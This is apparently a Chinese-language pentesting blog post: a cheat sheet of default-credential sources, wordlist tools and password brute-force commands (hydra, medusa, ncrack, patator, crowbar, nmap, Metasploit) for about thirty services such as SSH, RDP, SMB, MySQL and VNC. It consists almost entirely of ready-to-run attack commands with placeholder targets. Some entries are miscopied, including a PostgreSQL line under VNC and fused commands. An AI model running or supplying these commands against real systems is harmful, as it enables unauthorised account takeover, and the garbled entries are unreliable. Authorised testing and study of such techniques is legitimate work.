---

- 如果你对渗透测试充满兴趣，欢迎加入知识星球

---
![](https://ftp.bmp.ovh/imgs/2020/08/39ee7328c349b474.jpg)


此文章干货内容较多，为方便你阅读，特整理了该文章的目录结构：


- 默认凭证
- 一些好用的字典
- 创建你自己的字典
  - Crunch
  - Cewl
  - Pydictor
- 远程服务爆破：
  - AFP
  - AJP
  - Cassandra
  - CouchDB
  - FTP
  - HTTP Generic Brute
  - HTTP Basic Auth
  - HTTP - Post Form
  - HTTP- CMS
  - IMAP
  - IRC
  - ISCSI
  - LDAP
  - Mongo
  - MySQL
  - OracleSQL
  - РОР
  - PostgreSQL
  - PPTP
  - RDP
  - Redis
  - Rexec
  - Rlogin
  - Rsh
  - Rsync
  - RTSP
  - SNMP
  - SMB
  - SMTP
  - SQL Server
  - SSH
  - Telnet
  - VNC

下面正文开始啦~

# 默认凭证
在进行暴力破解之前，我们首先应该尝试该服务的默认口令，这样也许可以节约大量的时间和工作量。

可以通过谷歌/Bing查询不同服务的默认口令，也可以直接参看下面这些链接（已经整理好了部分服务的默认口令）（如果你还无法使用 Google，欢迎私聊我，我会告诉你方法）：
```
http://www.phenoelit.org/dpl/dpl.html
http://www.vulnerabilityassessment.co.uk/passwordsC.htm
https://192-168-1-1ip.mobi/default-router-passwords-list/
https://datarecovery.com/rd/default-passwords/
https://bizuns.com/default-passwords-list
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv
https://github.com/Dormidera/WordList-Compendium
https://www.cirt.net/passwords
http://www.passwordsdatabase.com/
```
# 一些好用的字典
如果默认口令无法放登录，可以尝试使用字典暴力破解，这里我为你整理了一些好用的字典仓库（感谢这些大佬的风险）：
```
https://github.com/danielmiessler/SecLists
https://github.com/Dormidera/WordList-Compendium
https://github.com/kaonashi-passwords/Kaonashi
```
# 创造你自己的字典
有时候别人整理好的字典也不一定能爆破成功，因为不用的目标侧重也是不同的，那能不能根据不同目标动态生成专属字典呢？答案是可以的！

创建专属字典的核心思想就是：尽可能查找与测试目标有关的信息并生成自定义词典。
可能用到的工具：

## Crunch
```
crunch 4 6 0123456789ABCDEF -o crunch1.txt #使用指定字符，生成长度4到6的字符串
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha 
 ```
## Cewl

此工具能根据目标登录页面自动抓取关键词并生成字典：
```
cewl example.com -m 5 -w words.txt
```
## pydictor

一个强大实用的黑客暴力破解字典创建工具

# 远程服务爆破
按服务名称的字母顺序排列：

## AFP
```
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
## AJP
```
nmap --script ajp-brute -p 8009 <IP>
```
## Cassandra
```
nmap --script cassandra-brute -p 9160 <IP>
```
## CouchDB
```
msf> use auxiliary/scanner/couchdb/couchdb_login
```
## FTP
```
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
## HTTP Basic Auth
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
## HTTP - Post Form
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
如果是 https ，你可以将 "http-post-form" 替换成"https-post-form"

## HTTP - CMS -- (W)ordpress, (J)oomla or (D)rupal or (M)oodle
cmsmap -f W/J/D/M -u a -p a WordPress.com: Create a Free Website or Blog
```
## IMAP
```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
## IRC
```
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
## ISCSI
```
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
## LDAP
```
nmap --script ldap-brute -p 389 <IP>
```
## Mongo
```
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
## MySQL
```
hydra -L usernames.txt -P pass.txt <IP> mysql
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
```
## OracleSQL
```
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#nmap fails sometimes for some reson executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```

为了使用 patator 进行 oracle_login 登录操作，你首先需要安装一些依赖文件：
```
pip3 install cx_Oracle --upgrade
Offline OracleSQL hash bruteforce (versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3):
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
## POP
```
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
## PostgreSQL
```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
## PPTP
```

你可以从这里下载 thc-pptp-bruter.deb文件进行安装: Index of /pool/main/t/thc-pptp-bruter

sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
## RDP

方法一：
```
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```

方法二：Crowbar 
- 工具：Crowbar
- 安装：`sudo apt install crowbar `
- 使用：

**爆破单主机：**
```
# 当爆破 RDP 服务时，线程最好使用 1，因为 RDP 不能很好地处理多线程，**如果使用多线程，会造成误报和漏报**
>> crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1 -v

Command explain:
-b 协议
-s 目标
-u 用户名
-C 密码字典
-n 线程
-v 详细模式
```
**爆破网段(多个主机)**
```
>> crowbar -b rdp -s 10.11.0.22/32 -u admin -d -C ~/password-file.txt -n 1 

Command explain:
-d port discover，会在爆破之前根据-b 指定的服务去扫描端口，如果端口未开放则跳过这台主机
```

爆破成功之后使用rdesktop尝试登录：
```
rdesktop -g 50% -u Administrator -p {password} {IP}
```


## Redis
```
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt <IP> redis
```
## Rexec
```
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
## Rlogin
```
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
## Rsh
```
hydra -L <Username_list> rsh://<Victim_IP> -v -V
参考链接：rsh-grind | pentestmonkey
```
## Rsync
```
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
## RTSP
```
hydra -l root -P passwords.txt <IP> rtsp
```
## SNMP
```
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
## SMB
```
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
## SMTP
```
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
## SQL Server
```
#Use the NetBIOS name of the machine as domain
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be carefull with the number of password in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be carefull, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
## SSH
```
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
```
## Telnet
```
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
## VNC
```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
